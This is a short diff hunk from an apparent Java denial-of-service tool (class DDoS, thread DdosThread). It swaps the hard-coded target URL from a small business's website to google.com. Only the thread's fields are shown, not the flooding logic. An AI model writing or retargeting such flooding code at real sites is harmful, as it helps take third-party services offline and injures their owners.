@@ -19,7 +19,7 @@ public class DDoS {
     public static class DdosThread extends Thread {
  
         private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = "http://www.judkinscustomtaxidermy.com";
+        private final String request = "http://www.google.com";
         private final URL url;
  
         String param = null;
